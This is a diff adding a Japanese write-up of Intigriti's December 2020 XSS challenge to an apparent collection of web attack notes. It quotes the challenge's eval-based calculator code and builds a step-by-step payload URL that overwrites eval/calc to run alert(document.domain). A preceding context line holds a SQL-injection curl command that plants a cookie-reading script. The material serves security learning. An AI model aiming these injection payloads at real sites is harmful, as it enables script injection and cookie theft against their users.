@@ -979,6 +979,168 @@ return substr( $ua, 0, 254 );
 ```txt
 curl http://yourls.local/ozh -H "User-Agent: test', '', ''), ('', NOW(), 'ozh', concat(char(60), 'script', char(62), 'alert(document.cookie);', char(60), '/script', char(62)), '', '', '') #"
 ```
+## eval Injection / overwrite function with eval (calc -> alert,eval) (Intigriti's December XSS Challenge 2020)
+https://medium.com/bugbountywriteup/intigritis-december-xss-challenge-2020-unintended-solution-8205b4a4b95b  
+- **entrypoint**   
+![image](https://user-images.githubusercontent.com/56021519/103669714-0ae29700-4fbc-11eb-9875-e579d4cbcfe6.png)  
+`https://challenge-1220.intigriti.io/?num1=1&operator=%2B&num2=3`みたいな感じで計算を実行する。計算するということは`eval`があるのでは？？？と予測もできそう  
+以下のJSで計算機を実装している。evalは`function calc`の最後に存在している。  
+```js
+window.name = "Intigriti's XSS challenge";
+
+const operators = ["+", "-", "/", "*", "="];
+function calc(num1 = "", num2 = "", operator = ""){
+  operator = decodeURIComponent(operator);
+  var operation = `${num1}${operator}${num2}`;
+  document.getElementById("operation").value = operation;
+  if(operators.indexOf(operator) == -1){
+    throw "Invalid operator.";
+  }
+  if(!(/^[0-9a-zA-Z-]+$/.test(num1)) || !(/^[0-9a-zA-Z]+$/.test(num2))){
+    throw "No special characters."
+  }
+  if(operation.length > 20){
+    throw "Operation too long.";
+  }
+  return eval(operation);
+}
+
+function init(){
+  try{
+    document.getElementById("result").value = calc(getQueryVariable("num1"), getQueryVariable("num2"), getQueryVariable("operator"));
+  }
+  catch(ex){
+    console.log(ex);
+  }
+}
+
+function getQueryVariable(variable) {
+    window.searchQueryString = window.location.href.substr(window.location.href.indexOf("?") + 1, window.location.href.length);
+    var vars = searchQueryString.split('&');
+    var value;
+    for (var i = 0; i < vars.length; i++) {
+        var pair = vars[i].split('=');
+        if (decodeURIComponent(pair[0]) == variable) {
+            value = decodeURIComponent(pair[1]);
+        }
+    }
+    return value;
+}
+
+/*
+ The code below is calculator UI and not part of the challenge
+*/
+
+window.onload = function(){
+ init();
+ var numberBtns = document.body.getElementsByClassName("number");
+ for(var i = 0; i < numberBtns.length; i++){
+   numberBtns[i].onclick = function(e){
+     setNumber(e.target.innerText)
+   };
+ };
+ var operatorBtns = document.body.getElementsByClassName("operator");
+ for(var i = 0; i < operatorBtns.length; i++){
+   operatorBtns[i].onclick = function(e){
+     setOperator(e.target.innerText)
+   };
+ };
+
+  var clearBtn = document.body.getElementsByClassName("clear")[0];
+  clearBtn.onclick = function(){
+    clear();
+  }
+}
+
+function setNumber(number){
+  var url = new URL(window.location);
+  var num1 = getQueryVariable('num1') || 0;
+  var num2 = getQueryVariable('num2') || 0;
+  var operator = getQueryVariable('operator');
+  if(operator == undefined || operator == ""){
+    url.searchParams.set('num1', parseInt(num1 + number));
+  }
+  else if(operator != undefined){
+    url.searchParams.set('num2', parseInt(num2 + number));
+  }
+  window.history.pushState({}, '', url);
+  init();
+}
+
+function setOperator(operator){
+  var url = new URL(window.location);
+  if(getQueryVariable('num2') != undefined){ //operation with previous result
+    url.searchParams.set('num1', calc(getQueryVariable("num1"), getQueryVariable("num2"), getQueryVariable("operator")));
+    url.searchParams.delete('num2');
+    url.searchParams.set('operator', operator);
+  }
+  else if(getQueryVariable('num1') != undefined){
+    url.searchParams.set('operator', operator);
+  }
+  else{
+    alert("You need to pick a number first.");
+  }
+  window.history.pushState({}, '', url);
+  init();
+}
+
+function clear(){
+    var url = new URL(window.location);
+    url.searchParams.delete('num1');
+    url.searchParams.delete('num2');
+    url.searchParams.delete('operator');
+    window.history.pushState({}, '', url);
+    document.getElementById("result").value = "";
+    init();
+}
+```
+calcのなかでnum1,num2は英数字しか使えないようにし、operatorは`["+", "-", "/", "*", "="]`の中のどれかしか使えず、最終的には``var operation = `${num1}${operator}${num2}`;``として文字列を結合してから`return eval(operation);`でevalに挿入している。  
+したがって、`=`は使えるので、`a=1`みたいなevalを実行すれば、Javascriptのaという変数に1という値を代入することができる。  
+ここで、`eval=alert`とすれば、eval関数をalert関数でオーバーライド(上書き)することになる。  
+```txt
+https://challenge-1220.intigriti.io/?num1=eval&operator=%3D&num2=alert
+
+// 上の状態で数字をクリックすると、以下のようなURLに変化しalertがポップする
+https://challenge-1220.intigriti.io/?num1=eval&operator=%3D&num2=NaN
+```
+![image](https://user-images.githubusercontent.com/56021519/103670665-32862f00-4fbd-11eb-9bd9-900d5cfea409.png)  
+  
+`document.domain`をalertしたいが、num1には記号は使えないため、なんとかcalcの中のこの記号をはじく処理に到達する前にXSSしたい。calc関数そのものをalert関数に置き換えれば、`function calc(num1 = "", num2 = "", operator = "")`の第一引数num1が`alert(num1)`みたいにできる。  
+ここで、1回目でcalcをalertに変換して2回目で置き換えたcalcを実行したい。  
+以下のように置き換えた後に何かボタンを押してみると、num1の値の`calc`がalertされて、そこにdocument.domainをセットする方法がわからない…  
+```txt
+https://challenge-1220.intigriti.io/?num1=calc&operator=%3D&num2=alert
+```
+![image](https://user-images.githubusercontent.com/56021519/103671253-ff906b00-4fbd-11eb-8ac6-02dd00fe3869.png)  
+  
+ここで、`#`を使えばいけるらしい。  
+以下のようにURLでアクセスした後にボタンを押すと、`calc`ではなく`undefined`が表示された。これは、`sometext`が二回目のcalcに入っているからである(細かい挙動はよくわからんけどとりあえずこうなったから多分そうなってるだろうってだけ)  
+```txt
+https://challenge-1220.intigriti.io/#sometext?num1=calc&operator=%3D&num2=alert
+```
+![image](https://user-images.githubusercontent.com/56021519/103671530-631a9880-4fbe-11eb-8c7b-1e0a79f862aa.png)  
+  
+じゃあ、`sometext`の場所を`num1=1`にして同じようにしてみると、先ほどと同じように`undefined`がalertされる。  
+```txt
+https://challenge-1220.intigriti.io/#num1=1?num1=calc&operator=%3D&num2=alert
+```
+じゃあ、`sometext`を`num1=1`じゃなくて`&num1=1`にすると、`1?num1`がalertされた！  
+alertだと後ろに`?num1`っていうゴミが付いてきちゃうので、代わりにevalを使って、ごみの部分を`//`でコメントアウトする。  
+```txt
+https://challenge-1220.intigriti.io/#&num1=1?num1=calc&operator=%3D&num2=alert
+```
+これでXSS成功！  
+```txt
+https://challenge-1220.intigriti.io/#&num1=alert(document.domain);//?num1=calc&operator=%3D&num2=eval
+
+// 上の状態で数字をクリックすると、以下のようなURLに変化しalertがポップする
+https://challenge-1220.intigriti.io/?num2=NaN#&num1=alert(document.domain);//?num1=calc&operator=%3D&num2=eval
+```
+![image](https://user-images.githubusercontent.com/56021519/103672125-36b34c00-4fbf-11eb-9bdd-af009d00c913.png)  
+- **Payload**   
+```txt
+https://challenge-1220.intigriti.io/#&num1=alert(document.domain);//?num1=calc&operator=%3D&num2=eval
+```
 ## 
 - **entrypoint**   
 - **概要**   
